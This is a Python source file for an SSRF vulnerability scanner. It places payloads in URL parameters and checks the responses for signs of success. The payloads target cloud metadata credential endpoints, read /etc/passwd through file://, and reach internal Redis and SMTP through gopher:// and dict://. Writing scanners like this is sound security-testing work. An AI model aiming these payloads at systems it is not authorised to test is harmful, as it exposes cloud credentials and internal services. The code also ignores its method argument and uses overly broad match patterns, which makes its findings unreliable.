"""tools/ssrf_scanner.py — Server-Side Request Forgery (SSRF) Scanner.

Detects SSRF vulnerabilities by sending payloads that trigger outbound
requests from the server. Uses various techniques:
- Internal IP/port scanning
- Cloud metadata endpoint testing
- DNS rebinding
- Protocol smuggling (gopher://, file://, etc.)

Public API:
    SSRFScanner - Main scanner class
    SSRFResult - Result of a single test
    SSRFScanResult - Full scan results
"""

from __future__ import annotations

import logging
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("elengenix.ssrf_scanner")


@dataclass
class SSRFResult:
    """Result of a single SSRF test."""
    url: str
    param: str
    payload: str
    vulnerable: bool
    response_contains: str = ""
    evidence: str = ""
    severity: str = "High"
    confidence: float = 0.0


@dataclass
class SSRFScanResult:
    """Full SSRF scan results."""
    target: str
    results: List[SSRFResult] = field(default_factory=list)
    vulnerable_params: List[str] = field(default_factory=list)
    total_tests: int = 0
    duration: float = 0.0

    @property
    def is_vulnerable(self) -> bool:
        return any(r.vulnerable for r in self.results)

    def summary(self) -> Dict[str, Any]:
        return {
            "target": self.target,
            "vulnerable": self.is_vulnerable,
            "vulnerable_params": self.vulnerable_params,
            "total_findings": len([r for r in self.results if r.vulnerable]),
            "total_tests": self.total_tests,
            "duration": self.duration,
        }


# SSRF payloads for different contexts
SSRF_PAYLOADS = [
    # Internal IPs
    ("http://127.0.0.1", "127.0.0.1"),
    ("http://localhost", "localhost"),
    ("http://0.0.0.0", "0.0.0.0"),
    ("http://[::1]", "IPv6 localhost"),
    
    # Cloud metadata endpoints
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://169.254.169.254/metadata/instance", "Azure metadata"),
    
    # Protocol smuggling
    ("gopher://127.0.0.1:25/", "SMTP via gopher"),
    ("file:///etc/passwd", "Local file read"),
    ("dict://127.0.0.1:6379/", "Redis via dict"),
    
    # Internal services
    ("http://127.0.0.1:8080", "Internal web service"),
    ("http://127.0.0.1:3000", "Internal web service"),
    ("http://127.0.0.1:5000", "Internal web service"),
    ("http://127.0.0.1:9200", "Elasticsearch"),
    ("http://127.0.0.1:6379", "Redis"),
    ("http://127.0.0.1:27017", "MongoDB"),
]

# SSRF detection patterns in responses
SSRF_INDICATORS = [
    (r"root:x:0:0", "Linux passwd file"),
    (r"ami-id", "AWS metadata"),
    (r"instance-id", "Cloud instance metadata"),
    (r"internal", "Internal service response"),
    (r"127\.0\.0\.1", "Loopback address in response"),
    (r"connection refused", "Port closed"),
    (r"connection reset", "Port closed"),
]


class SSRFScanner:
    """SSRF vulnerability scanner.
    
    Tests URL parameters for SSRF by injecting payloads that trigger
    outbound requests from the server.
    
    Example:
        scanner = SSRFScanner()
        result = scanner.scan("https://example.com/fetch?url=test")
        if result.is_vulnerable:
            print(f"SSRF found in params: {result.vulnerable_params}")
    """
    
    def __init__(
        self,
        timeout: float = 10.0,
        verify_ssl: bool = False,
        max_redirects: int = 5,
    ):
        """Initialize the SSRF scanner.
        
        Args:
            timeout: Request timeout in seconds.
            verify_ssl: Whether to verify SSL certificates.
            max_redirects: Maximum number of redirects to follow.
        """
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.max_redirects = max_redirects
    
    def scan(
        self,
        target_url: str,
        params: Optional[Dict[str, str]] = None,
        method: str = "GET",
    ) -> SSRFScanResult:
        """Scan a URL for SSRF vulnerabilities.
        
        Args:
            target_url: The URL to test.
            params: URL parameters to test. If None, auto-discovers parameters.
            method: HTTP method to use.
            
        Returns:
            SSRFScanResult with all test results.
        """
        import requests
        
        start_time = time.time()
        result = SSRFScanResult(target=target_url)
        
        # Parse the URL to get existing parameters
        parsed = urllib.parse.urlparse(target_url)
        existing_params = dict(urllib.parse.parse_qsl(parsed.query))
        
        # Merge with provided params
        test_params = {**existing_params, **(params or {})}
        
        # If no parameters, test common ones
        if not test_params:
            test_params = {
                "url": "",
                "uri": "",
                "path": "",
                "src": "",
                "dest": "",
                "redirect": "",
                "feed": "",
                "file": "",
                "document": "",
                "page": "",
            }
        
        # Test each parameter with each payload
        for param_name, original_value in test_params.items():
            for payload, description in SSRF_PAYLOADS:
                result.total_tests += 1
                
                try:
                    # Build test URL
                    test_params_copy = dict(test_params)
                    test_params_copy[param_name] = payload
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(query=urllib.parse.urlencode(test_params_copy))
                    )
                    
                    # Make request
                    response = requests.get(
                        test_url,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        allow_redirects=False,
                    )
                    
                    # Check for SSRF indicators
                    response_text = response.text[:10000]
                    for pattern, indicator_desc in SSRF_INDICATORS:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            ssrf_result = SSRFResult(
                                url=test_url,
                                param=param_name,
                                payload=payload,
                                vulnerable=True,
                                response_contains=pattern,
                                evidence=f"Response contains {indicator_desc}",
                                severity="High",
                                confidence=0.8,
                            )
                            result.results.append(ssrf_result)
                            if param_name not in result.vulnerable_params:
                                result.vulnerable_params.append(param_name)
                            logger.info(f"SSRF found: {param_name} with {description}")
                            break
                    
                except requests.exceptions.Timeout:
                    # Timeout might indicate the server tried to connect
                    logger.debug(f"Timeout for {param_name}={payload}")
                except requests.exceptions.ConnectionError as e:
                    # Connection error might indicate SSRF worked
                    if "refused" in str(e).lower():
                        logger.debug(f"Connection refused for {param_name}={payload}")
                except Exception as e:
                    logger.debug(f"Error testing {param_name}: {e}")
        
        result.duration = time.time() - start_time
        return result
    
    def scan_with_params(
        self,
        target_url: str,
        param_names: List[str],
        method: str = "POST",
    ) -> SSRFScanResult:
        """Scan specific parameters for SSRF.
        
        Args:
            target_url: The URL to test.
            param_names: List of parameter names to test.
            method: HTTP method to use.
            
        Returns:
            SSRFScanResult with all test results.
        """
        params = {name: "" for name in param_names}
        return self.scan(target_url, params=params, method=method)
